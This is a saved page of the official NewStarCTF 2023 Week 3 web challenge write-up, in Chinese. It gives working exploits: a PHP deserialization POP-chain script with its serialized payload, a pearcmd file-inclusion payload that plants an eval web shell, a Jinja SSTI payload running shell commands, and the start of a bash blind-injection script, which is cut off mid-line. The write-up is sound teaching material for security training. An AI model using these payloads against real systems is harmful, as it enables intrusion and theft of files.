        <div id="file-page-header"><div id="ToastsContainer_ShimoUI"><div class="Toastify"></div></div><div class="sc-exAgwC doEjVX"><div class="sc-cQFLBn jqmOiT"><div class="sc-gisBJw cbYHdA"><a class="sc-caSCKo iaSppr" href="https://shimo.im/desktop"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 106 25" class="sc-fAjcbJ kOTtUa"><path d="M24.9 2.9L23.1.8l-1.7 1.5H2l1 1.2c.1.1.2.1.3.1.2 0 3.3-.1 7.2-.1C8.3 9 5.8 14.1.2 18.6c-.1 0-.1.1-.1.2s.1.2.2.2h.1c5-3.2 7.8-6.8 8.1-7.3v12.8c0 .2.3.3.4.3.9-1.1 1.5-2.1 1.6-3.3 1 0 5.5 0 8-.1.3.3.5.3.7 1.3 0 .2.1.2.3.2h.1c1.7-1 1.9-1.9 1.9-5v-5.6c0-.1 0-.1.1-.2l.5-1.1c.1-.1.1-.2 0-.3l-1.9-1.1c-.1-.1-.3 0-.3.1l-.5 1.1c0 .1-.1.1-.2.1h-8.3l-1.2-.5c1.4-1.8 2-2.9 2.8-4.3.1-.2.1-.3.2-.3.2-.1.2-.3.1-.5l-.1-.1c-.7-.5-1.3-1-1.7-1.7 2.9-.1 13.8-.2 13.8-.2.1 0 .2-.1.1-.4zm-14.3 8.6l.3-.2h8.2c.1 0 .3.1.3.3v7.2c0 .5-.1 1.2-.6 1.7l-.2.1h-8v-9.1zm25.8 1.6c1.4.6 2.4 1.3 2.9 1.7s.5.8 0 1.4c-.1.2-.2.3-.6.6-.6.4-1 .3-1.2-.4-.3-1.6-.8-2.7-1.4-3.3.1.1.1 0 .3 0zm5.8 0c1.5.6 2.4 1.2 3 1.6.5.4.5.8.1 1.4-.1.2-.2.3-.6.7-.6.4-1 .3-1.2-.3-.4-1.6-.9-2.7-1.5-3.2 0-.1.1-.2.2-.2zm-8.5-.1l.1-.1c.1 0 .1 0 .1.1 0 0-.2 2.9-.5 3.5-.2.6-.6.8-1.3.6-.3-.1-1-.4-1-.4-.5-.3-.4-.8 0-1.1 1.5-.9 2.2-1.6 2.6-2.6zm19 9.5v.1c0 .1 0 .1-.1.1H30.3s-.1 0-.2-.1l-.7-.6h10.9v-2.3c-4.1 0-8.1.1-8.3.1 0 0-.1 0-.2-.1l-.7-.7h9.2v-3.6l2.1.5c.1 0 .1.1 0 .2l-.2.3V19h6.1l1.2-1.2 1.5 1.6v.1s0 .1-.1.1h-.1s-4.3 0-8.8.1V22h7l1.5-1.6 2.2 2.1zm-2.1-8.2c.6.3.7.7.3 1.5-.1.2-.1.4-.5.8-.5.5-1 .5-1.3-.1-.7-1.6-1.4-2.7-2.1-3.1-.1-.1 0-.2.1-.2 1.7.3 2.8.7 3.5 1.1zm1.3-1.7l.1.1c0 .1-.1.1-.1.1h-.1c-20.6-.1-20.6 0-20.8 0 0 0-.1 0-.2-.1l-.7-.7 10.2.1v-1.9h-7s-.1 0-.2-.1l-.7-.7 7.9.1V7.7h-6.5c-.4.4-1.1 1-1.4 1.2l-.1.1c-.1 0-.2-.1-.2-.2V1.7l2 .6h14.3l.6-1 1.1.6.7.3c.1 0 .1.1 0 .2l-.4.8v4.1l.1.2c.1.1-.1.3-.2.3h-7.9v1.8h5.1l1.1-1.1 1.5 1.5v.1s0 .1-.1.1h-7.7v1.9h7l1.2-1.1 1.4 1.6zm-9.7-9.8v4.3h1.5c.9-1.3 1.2-2.2 1.6-3.8 0-.1 0-.2.1-.2 0 0 .1 0 .1.1l1.3 1.2c.1.1.2.2 0 .4-.6 1.2-2.5 2.1-3.1 2.3h4.4V2.8h-5.9zm-2 4.3V2.8h-6.3v4.3h6.3zm-1.8-2.5c.4.3.4.7 0 1.3-.1.2-.2.3-.5.6-.5.4-.9.2-1.1-.3-.3-1.5-.7-2.5-1.3-3 0-.1 0-.2.1-.1 1.5.5 2.3 1.1 2.8 1.5zM67 4.5C66.3 2.4 65.6 1 64.7.4c-.1-.1 0-.3.2-.2 2 .6 3.1 1.5 3.9 2 .7.4.7 1 .2 1.9-.1.2-.3.5-.5.7-.6.7-1.2.5-1.5-.3zm11.8 16c.1 0 .2.1.2.3 0 .1-.1.2-.2.2s-.4.1-.6.1c-.8.1-2 .4-2.5 1.6l-.1.1-.1.1h-.2c-2-.9-6.5-3-8.1-4.7l-.1-.1c-2.4 2.2-5.4 3.6-10.6 5h-.1c-.1 0-.2-.1-.2-.2s.1-.2.1-.2c4.4-1.8 7.4-3.8 9.5-6-2.2-2.8-3-5.5-4-10h-4.4c-.1 0-.2 0-.3-.1l-.8-.9h18.8l1.5-1.6L78.3 6c.1.2 0 .3-.2.3 0 0-3.3.1-6.7.2.5.3 1.1.5 1.7.6 0 0 .1 0 .1.1.2.1.1.4-.1.4-.1 0-.4.2-.4.4-.7 2.7-2.3 6.4-4.2 8.5l-.2.2c3.2 2.1 6.6 2.9 10.5 3.8zm-16.1-14c1.2 4 2.7 6.8 4.5 8.7 1.9-2.6 2.9-5.5 3.6-8.8-2.4.1-4.8.1-5.9.1h-2.2zm42.9-3.2c.2.1.1.3-.1.4-.1 0-.3.2-.4.4-1.4 1.7-2.7 3.3-4.8 4.9h-.1c-.1 0-.2-.1-.2-.2s.1-.1.1-.2c1.6-2.7 2.2-4 3-6.4 0-.1.1-.2.2-.2s.2.1.2.1l.1.1c.6.3 1.4.8 2 1.1zM94 7.6c-.1-2.1-1.1-4.7-1.7-5.4 0-.1.1-.2.2-.2 1.6 1.3 2.3 2 3 2.6 1.1 1.1 1 2.5.4 3.2-.2.2-.2.3-.4.4-.9.6-1.4.3-1.5-.6zm-1.4 5.8c-.1.2-.3.3-.4.5-.5.5-1 .3-1.3-.3-.4-1.6-.9-2.6-1.5-3.2v9.8c-.1 1.3-.4 2.3-1.4 3.5-.2.1-.5 0-.5-.3V11.2c-.8 2.5-2.7 4.9-4.6 7 0 .1-.1.1-.1.1-.1.1-.2 0-.3-.1-.1-.1 0-.2 0-.3 3.1-4.4 4-7.9 4.7-11.1h-3.3s-.1 0-.2-.1L83 6l4.2.1h.3v-6l2.1.6c.1.1.1.1 0 .2l-.3.3v4.9h1L91.5 5l1.6 1.5.1.1c0 .1-.1.1-.1.1h-3.7v2.8c1.6.6 2.6 1.4 3.1 2 .4.6.6 1.2.1 1.9zm12.6-3.9c.1.1.1.2 0 .3l-.6 1.1c0 .1-.1.1-.1.2v6.2c0 3.4.1 4.5-1.8 5.7h-.1c-.2 0-.3 0-.3-.2-.3-1.1-.4-1.1-.8-1.4-2.8.1-8 .1-9.1.1l-.6-.8h9.8l.2-.1c.5-.6.7-1.3.7-1.9V16s-.1-.1-.2-.1h-9.4l-.6-.7h10v-4.6c0-.2-.1-.3-.3-.3h-9.4l-.6-.7h5.1V.1l2.2.6c.1.1.1.1 0 .2l-.4.3v8.3h3c.1 0 .2-.1.2-.1l.5-1c.1-.1.3-.2.4-.1l2.2 1.2z" fill="#a5a5a5"></path></svg></a></div><div class="sc-fMiknA fWfGDr">NewStarCTF 2023 Week3 官方WriteUp</div><button class="sc-lhVmIH iAQwBy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="20px" height="20px"><path d="M13.5 16.9V4.5h-7v12.4l3.5-3.5 3.5 3.5z" fill="none" stroke="#a5a5a5"></path></svg></button><div class="sc-elJkPf cuKFxh"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" class="sc-bYSBpT cZZyrb" width="12px" height="12px"><path d="M7 13c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6zm0-1c2.8 0 5-2.2 5-5S9.8 2 7 2 2 4.2 2 7s2.2 5 5 5zm2.2-8l.8.4L6.1 10 4 7l.7-.6L6.1 8l3.1-4z" fill="#7a9880"></path></svg>今天 0:14 更新</div></div><div class="sc-gojNiO hAHnBB"><span style="display:inline-block;cursor:not-allowed" class="file-demo-screen-btn"><button class="sm-button sc-hzDkRC iObLYz sc-1n784rm-0 sfCUt" type="primary" disabled="" style="pointer-events:none"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="sc-jhAzac cUDKsr" width="20px" height="20px"><path d="M10 17c-3.9 0-7-3.1-7-7s3.1-7 7-7 7 3.1 7 7-3.1 7-7 7zm0-1c3.3 0 6-2.7 6-6s-2.7-6-6-6-6 2.7-6 6 2.7 6 6 6zm-1.5-3.5v-5l4 2.4-4 2.6z" fill="#555"></path></svg></button></span><button class="register sc-btzYZH jVcKXm">注册</button><button class="login sc-btzYZH jVcKXm">登录</button><button class="sm-button sc-kvZOFW dStWqN sc-1n784rm-0 inYJrZ" type="default"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" width="18px" height="18px"><path d="M18 12c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm0 9c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm0 9c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2z" fill="#41464b"></path></svg></button></div></div><div style="position: absolute; top: 0px; left: 0px; width: 100%;"><div><div class="sm-tooltip  randomClass-mvIob  sm-tooltip-theme-blue sm-tooltip-placement-bottom " style="z-index: 998; left: 1598.09px; top: 39px;"><div class="sm-tooltip-content"><div class="sm-tooltip-arrow"></div><div class="sm-tooltip-inner"><span class="sc-cmTdod jqVHLt">开启更多功能，提升办公效能<span class="sc-jwKygS iyLjmU"></span></span></div></div></div></div></div></div>
        <div id="app-container" class="sm-docs-container external-readonly">
            <div id="editor-scroller" class="editor-scroller">
                <div id="editor" class="ql-container ql-disabled ql-snow ">
                    <div class="ql-title"><div class="ql-title-box" data-value="NewStarCTF 2023 Week3 官方WriteUp"><input data-value="NewStarCTF 2023 Week3 官方WriteUp" readonly="true" class="mousetrap" id="ql-title-input" autocomplete="off" autocorrect="off" spellcheck="false" value="NewStarCTF 2023 Week3 官方WriteUp"></div></div>
                    <div class="ql-editor"><p ql-global="true" class="ql-align-center ql-heading-title" line="dac2" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Web</p><h1><div ql-global="true" line="swPF" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>POP Gadget</div></h1><ul data-list-style="circle"><li ql-global="true" line="qn7V" class="bullet-item"><strong>考点</strong>：PHP反序列化 POP构造</li></ul><ul data-list-style="circle"><li ql-global="true" line="f63m" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="V1vU" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="wlHZ">题目主要考察POP链构造，整个链子比较简单。从Begin的__destruct析构函数作为起点开始，构造POP链触发到WhiteGod的__unset方法，__unset方法中存在一个函数的动态调用，可以实现RCE。</p><p ql-global="true" line="i7oT">POP Gadget如下：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="8ugW" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-title class_">Begin</span>::<span class="hljs-variable constant_">__destruct</span> -&gt; <span class="hljs-title class_">Then</span>::<span class="hljs-variable constant_">__toString</span> -&gt; <span class="hljs-title class_">Super</span>::<span class="hljs-variable constant_">__invoke</span> -&gt; <span class="hljs-title class_">Handle</span>::<span class="hljs-variable constant_">__call</span> -&gt; CTF::<span class="hljs-variable constant_">end</span> -&gt; <span class="hljs-title class_">WhiteGod</span>::<span class="hljs-variable constant_">__unset</span></div></div><p ql-global="true" line="9gWb">编写Exp如下：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="oAoh" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">&lt;?php</span></div><div line="YgDF" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>{</div><div line="D2CP" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;</div><div line="hphq" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span></div><div line="En77" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-function">    </span>{</div><div line="mEqB" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$a</span>;</div><div line="zDyz" data-language="php" class="ql-code-block ql-word-wrap-true">    }</div><div line="fJsV" data-language="php" class="ql-code-block ql-word-wrap-true">}</div><div line="Qfje" data-language="php" class="ql-code-block ql-word-wrap-true"><br></div><div line="naTc" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>{</div><div line="aFUg" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;</div><div line="GcKM" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span></div><div line="wqHx" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-function">    </span>{</div><div line="LuDH" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable language_">$this</span>-&gt;func= <span class="hljs-variable">$a</span>;</div><div line="kzzC" data-language="php" class="ql-code-block ql-word-wrap-true">    }</div><div line="Zf7O" data-language="php" class="ql-code-block ql-word-wrap-true">}</div><div line="OyG3" data-language="php" class="ql-code-block ql-word-wrap-true"><br></div><div line="j8UF" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>{</div><div line="BZUn" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;</div><div line="geHX" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span></div><div line="lM52" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-function">    </span>{</div><div line="U29W" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-variable">$a</span>;</div><div line="D8Q0" data-language="php" class="ql-code-block ql-word-wrap-true">    }</div><div line="24NK" data-language="php" class="ql-code-block ql-word-wrap-true">}</div><div line="LX8W" data-language="php" class="ql-code-block ql-word-wrap-true"><br></div><div line="1ZMg" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>{</div><div line="FKOc" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;</div><div line="Lyjb" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span></div><div line="R2tl" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-function">    </span>{</div><div line="EaGm" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-variable">$a</span>;</div><div line="SSA3" data-language="php" class="ql-code-block ql-word-wrap-true">    }</div><div line="i7cb" data-language="php" class="ql-code-block ql-word-wrap-true">}</div><div line="TXd4" data-language="php" class="ql-code-block ql-word-wrap-true"><br></div><div line="4klp" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>{</div><div line="jvsY" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;</div><div line="16Rh" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span></div><div line="1H5W" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-function">    </span>{</div><div line="E6Ug" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-variable">$a</span>;</div><div line="ScDj" data-language="php" class="ql-code-block ql-word-wrap-true">    }</div><div line="xnWP" data-language="php" class="ql-code-block ql-word-wrap-true">}</div><div line="Q3E2" data-language="php" class="ql-code-block ql-word-wrap-true"><br></div><div line="s66J" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>{</div><div line="bA29" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;</div><div line="TrBV" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;</div><div line="HWfs" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span></div><div line="7d10" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-function">    </span>{</div><div line="4hZX" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-variable">$a</span>;</div><div line="17Qg" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-variable">$b</span>;</div><div line="828t" data-language="php" class="ql-code-block ql-word-wrap-true">    }</div><div line="VSpk" data-language="php" class="ql-code-block ql-word-wrap-true">}</div><div line="ls2V" data-language="php" class="ql-code-block ql-word-wrap-true"><br></div><div line="TxoE" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment">// POP Gadget: </span></div><div line="AU1o" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment">// Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span></div><div line="16Lz" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>(<span class="hljs-string">"readfile"</span>,<span class="hljs-string">"/flag"</span>))))));</div><div line="oLvK" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));</div></div><p ql-global="true" line="NL78">需要注意的是一些类中有保护或私有属性的成员，因此需要对序列化数据进行URL编码，得到：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="bcAF" data-language="php" class="ql-code-block ql-word-wrap-true">O%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Begin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Then%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Then%<span class="hljs-number">00</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Super%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Handle%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>CTF%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>handle%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>WhiteGod%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>readfile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span><span class="hljs-keyword">var</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D</div></div><p ql-global="true" line="mSRX"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1164" height="auto" ori-width="1164" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片.png" ori-height="783" data-src="https://uploader.shimo.im/f/VtzTsnglBvl2Pkf4.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="IJrX"><br></p><h1><div ql-global="true" line="wWkr" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Include 🍐</div></h1><ul data-list-style="circle"><li ql-global="true" line="IxwB" class="bullet-item"><strong>考点</strong>：PHP pearcmd文件包含</li></ul><ul data-list-style="circle"><li ql-global="true" line="Qhom" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="yaMN" class="bullet-item"><strong>解题步骤 </strong></li></ul><p ql-global="true" line="mNhD">本题主要考察pearcmd文件包含，在register_argc_argv为on的环境下，通过包含pearcmd.php和传参可实现rce</p><p ql-global="true" line="M85z">题目过滤了常见的伪协议和日志文件，提示 <span style="color: rgb(255, 128, 0);" class="ql-size-12">Something&nbsp;in&nbsp;phpinfo.php!</span></p><p ql-global="true" line="9U8K">?file=phpinfo</p><p ql-global="true" line="TqCy">查找flag，发现 <span style="background: rgb(221, 221, 221);color: rgb(34, 34, 34);" class="ql-font-microsoftyahei ql-size-9">fake{Check_register_argc_argv}</span></p><p ql-global="true" line="pwHJ">查找register_argc_argv，发现为on</p><p ql-global="true" line="GZiQ">结合标题🍐（pear），提示以及register_argc_argv为on，知道是要利用pearcmd文件包含达成rce，参考：<a class="ql-link" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow">Docker PHP裸文件本地包含综述</a></p><p ql-global="true" line="wF4I">payload：</p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="XDg9" data-language="plain" class="ql-code-block ql-word-wrap-true">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</div></div><p ql-global="true" line="WAsT"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="974" height="auto" ori-width="974" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image.png" ori-height="462" data-src="https://uploader.shimo.im/f/yAa5WTnBVKQhM1s4.png!thumbnail" crossorigin="anonymous"></span></span></span></p><div class="ql-code-block-container" data-language="plain" spellcheck="false"><div line="rvWh" data-language="plain" class="ql-code-block">?file=/tmp/cmd</div><div line="4d2N" data-language="plain" class="ql-code-block">#post</div><div line="2380" data-language="plain" class="ql-code-block">0=system("cat /flag");</div></div><p ql-global="true" line="rvJl"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="967" height="auto" ori-width="967" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(1).png" ori-height="439" data-src="https://uploader.shimo.im/f/d4GIQvf2MiDnp861.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="7OPD"><br></p><h1><div ql-global="true" line="H04W" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>GenShin</div></h1><ul data-list-style="circle"><li ql-global="true" line="UHrt" class="bullet-item"><strong>考点</strong>：SSTI</li></ul><ul data-list-style="circle"><li ql-global="true" line="w74s" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="qVRB" class="bullet-item"><strong>解题步骤 </strong></li></ul><p ql-global="true" line="6sVy">Python简单的SSTI，ban掉了一些内置函数但还剩下get_flashed_message()</p><p ql-global="true" line="hzpq">咱们直接</p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="PO3a" data-language="plain" class="ql-code-block ql-word-wrap-true">{% print(get_flashed_messages.__globals__.os["pop"+"en"]("cat /flag").read()) %}</div></div><p ql-global="true" line="KBFP">就可以了，当然有同学用的是字符串拼贴等绕过也是可以的，解法很多</p><p ql-global="true" line="IgKq"><br></p><h1><div ql-global="true" line="HaTp" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>R!!!C!!!E!!!!</div></h1><ul data-list-style="circle"><li ql-global="true" line="7HI8" class="bullet-item"><strong>考点</strong>：<span class="ql-font-microsoftyahei">Bash盲注</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="Upqj" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="KZsX" class="bullet-item"><strong>解题步骤 </strong></li></ul><p ql-global="true" line="Rp1G">非预期就是直接用 ls / |script xxx 这样写到根目录，没给权限设死</p><p ql-global="true" line="xU8N">预期是bash盲注</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="ztLj" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">import</span> time</div><div line="L5R5" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="6ls1" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">import</span> requests</div><div line="4gLb" data-language="python" class="ql-code-block ql-word-wrap-true">url = <span class="hljs-string">"http://bcdad1a5-6014-4594-a8b5-c4c03f581147.node4.buuoj.cn:81/"</span></div><div line="eTq5" data-language="python" class="ql-code-block ql-word-wrap-true">result = <span class="hljs-string">""</span></div><div line="JM9q" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):</div><div line="qWvB" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span 